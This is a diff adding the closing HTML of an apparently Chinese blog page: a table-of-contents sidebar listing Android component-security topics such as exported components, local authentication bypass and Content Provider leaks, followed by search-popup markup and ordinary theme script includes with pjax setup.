+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%85%B3%E4%BA%8E%E7%BB%84%E4%BB%B6"><span class="nav-text">0x01 关于组件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-exported%E5%B1%9E%E6%80%A7"><span class="nav-text">0x02 exported属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%AE%9E%E4%BE%8B"><span class="nav-text">0x03 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E8%8E%AB%E8%BF%87%E4%BA%8E%E6%9C%AC%E5%9C%B0%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E9%83%BD%E5%AD%98%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="nav-text">1、最常见的莫过于本地拒绝服务漏洞，四大组件都存在这个问题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E6%89%8B%E6%9C%BA%E7%AE%A1%E5%AE%B6com-tencent-qqpimsecure-service-InOutCallReceiver%E5%B9%BF%E6%92%AD%E7%BB%84%E4%BB%B6%E6%B2%A1%E6%9C%89%E5%AF%B9%E6%B6%88%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%A0%A1%E9%AA%8C%EF%BC%8C%E4%BC%A0%E5%85%A5%E7%A9%BA%E6%B6%88%E6%81%AF%E5%AF%BC%E8%87%B4NullPointerException%E5%BC%82%E5%B8%B8"><span class="nav-text">e.g. 某手机管家com.tencent.qqpimsecure.service.InOutCallReceiver广播组件没有对消息进行校验，传入空消息导致NullPointerException异常</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-text">2、绕过本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E8%8F%8A%E8%8A%B1%E7%BD%91%E7%9B%98%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81"><span class="nav-text">e.g. 某菊花网盘绕过本地密码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%8E%A7%E5%88%B6MIUI%E7%9A%84%E6%89%8B%E7%94%B5%E7%AD%92%E5%BC%80%E5%85%B3%EF%BC%88%E6%9C%89%E8%B6%A3%E7%9A%84%E6%A1%88%E4%BE%8B%EF%BC%89"><span class="nav-text">e.g. 控制MIUI的手电筒开关（有趣的案例）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E4%BC%AA%E9%80%A0%E6%B6%88%E6%81%AF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">3、伪造消息代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BA%91%E7%9B%98"><span class="nav-text">e.g. 某搜索引擎云盘</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E4%BC%98%E9%85%B7Android-4-5%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8D%87%E7%BA%A7%E6%BC%8F%E6%B4%9E"><span class="nav-text">e.g. 优酷Android 4.5客户端升级漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-text">4、敏感信息泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E5%BA%94%E7%94%A8%E9%9A%90%E5%BC%8Fintent%E5%8F%91%E9%80%81%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">e.g. 某应用隐式intent发送敏感信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">5、提升权限</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%B8%85%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">e.g. 某系统清理工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81Content-Provider-%E6%9A%B4%E9%9C%B2%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">6、Content Provider 暴露泄露敏感信息</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E4%B8%80%E5%8F%AA%E7%9C%BCapp%E5%BA%94%E7%94%A8%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">e.g. 一只眼app应用本地信息泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">7、任意文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#e-g-%E6%9F%90%E5%AE%A2%E6%88%B7%E7%AB%AFContent-Provider%E7%BB%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">e.g. 某客户端Content Provider组件任意文件读取漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8%E3%80%81%E5%90%AF%E5%8A%A8%E7%A7%81%E6%9C%89%E7%BB%84%E4%BB%B6%EF%BC%88%E8%BF%99%E5%B0%B1%E6%98%AF%E5%89%8D%E8%BE%B9%E6%8F%90%E5%88%B0%E7%9A%84%EF%BC%8C%E7%A7%81%E6%9C%89%E7%BB%84%E4%BB%B6%E4%B9%9F%E4%BB%85%E4%BB%85%E6%98%AF%E7%9B%B8%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84%EF%BC%89"><span class="nav-text">8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%9E%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%9A%E6%B2%A1%E6%9C%89%E5%88%97%E5%87%BA%EF%BC%8C%E5%A6%82UXSS%E3%80%81%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81%E3%80%81services%E5%8A%AB%E6%8C%81%E7%AD%89%E7%AD%89"><span class="nav-text">其实还有很多没有列出，如UXSS、界面劫持、services劫持等等</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E7%AE%80%E5%8D%95%E8%87%AA%E6%B5%8B"><span class="nav-text">0x04 简单自测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%8F%8D%E7%BC%96%E8%AF%91APK%E6%88%96%E7%9B%B4%E6%8E%A5%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-text">1、反编译APK或直接查看源代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81drozer%E6%89%AB%E6%8F%8F"><span class="nav-text">2、drozer扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E9%98%B2%E6%82%A3%E4%BA%8E%E6%9C%AA%E7%84%B6"><span class="nav-text">0x05 防患于未然</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
